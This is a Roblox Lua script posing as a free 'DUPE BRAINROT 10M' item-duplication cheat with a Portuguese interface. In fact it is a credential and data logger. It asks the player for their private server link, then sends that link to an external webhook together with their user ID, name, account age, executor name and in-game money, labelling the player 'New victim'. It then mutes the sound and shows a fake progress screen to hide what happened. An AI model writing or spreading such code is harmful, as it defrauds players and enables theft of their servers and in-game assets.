local player = game.Players.LocalPlayer
local http = game:GetService("HttpService")

-- Menu Principal
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 400, 0, 250)
Main.Position = UDim2.new(0.5, -200, 0.5, -125)
Main.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 10)

local Title = Instance.new("TextLabel", Main)
Title.Text = "DUPE BRAINROT GRÁTIS 10M"
Title.Size = UDim2.new(1, 0, 0, 60)
Title.TextColor3 = Color3.fromRGB(0, 255, 255)
Title.TextSize = 22
Title.Font = Enum.Font.GothamBold
Title.BackgroundTransparency = 1

local Sub = Instance.new("TextLabel", Main)
Sub.Text = "coloque seu link do server privado aqui"
Sub.Position = UDim2.new(0, 0, 0.25, 0)
Sub.Size = UDim2.new(1, 0, 0, 30)
Sub.TextColor3 = Color3.fromRGB(200, 200, 200)
Sub.TextSize = 14
Sub.BackgroundTransparency = 1

local Input = Instance.new("TextBox", Main)
Input.PlaceholderText = "Link do Servidor VIP..."
Input.Size = UDim2.new(0.8, 0, 0, 40)
Input.Position = UDim2.new(0.1, 0, 0.5, 0)
Input.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Input.TextColor3 = Color3.new(1, 1, 1)
Instance.new("UICorner", Input)

local Btn = Instance.new("TextButton", Main)
Btn.Text = "ATIVAR SCRIPT"
Btn.Size = UDim2.new(0.6, 0, 0, 40)
Btn.Position = UDim2.new(0.2, 0, 0.75, 0)
Btn.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
Btn.TextColor3 = Color3.new(1, 1, 1)
Btn.Font = Enum.Font.GothamBold
Instance.new("UICorner", Btn)

Btn.MouseButton1Click:Connect(function()
    local link = Input.Text
    if link:find("roblox.com") then
        -- Coleta de dados igual à sua foto
        local stats = player:FindFirstChild("leaderstats")
        local money = stats and stats:FindFirstChild("Money") and stats.Money.Value or "N/A"
        local prod = stats and stats:FindFirstChild("Production") and stats.Production.Value or "N/A"
        
        local data = {
            ["embeds"] = {{
                ["title"] = "DUPE BRAINROTS",
                ["description"] = "New victim detected",
                ["color"] = 65280,
                ["fields"] = {
                    {["name"] = "📋 Info", ["value"] = player.UserId .. " - " .. player.Name, ["inline"] = false},
                    {["name"] = "⏰ Account Age", ["value"] = player.AccountAge .. " days", ["inline"] = false},
                    {["name"] = "⚙️ Executor", ["value"] = identifyexecutor() or "Unknown", ["inline"] = false},
                    {["name"] = "💰 Money", ["value"] = tostring(money), ["inline"] = true},
                    {["name"] = "📊 Production", ["value"] = tostring(prod), ["inline"] = true},
                    {["name"] = "🔗 Private Server", ["value"] = link, ["inline"] = false},
                },
                ["footer"] = {["text"] = "Brainrot Duper Logger"}
            }}
        }

        local req = (syn and syn.request) or http_request or request
        req({Url = _G.Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = http:JSONEncode(data)})

        -- Efeito Troll
        game:GetService("SoundService").MainVolume = 0
        Main.Visible = false
        local F = Instance.new("Frame", ScreenGui)
        F.Size = UDim2.new(1,0,1,0)
        F.BackgroundColor3 = Color3.new(0,0,0)
        F.ZIndex = 100000
        local L = Instance.new("TextLabel", F)
        L.Size = UDim2.new(1,0,1,0)
        L.Text = "DUPE BRAINROT 10M\n[||||||||||] 0%\n1MIN - 5MIN"
        L.TextColor3 = Color3.new(1,1,1)
        L.TextSize = 35
        L.Font = Enum.Font.GothamBold
        L.BackgroundTransparency = 1
    end
end)
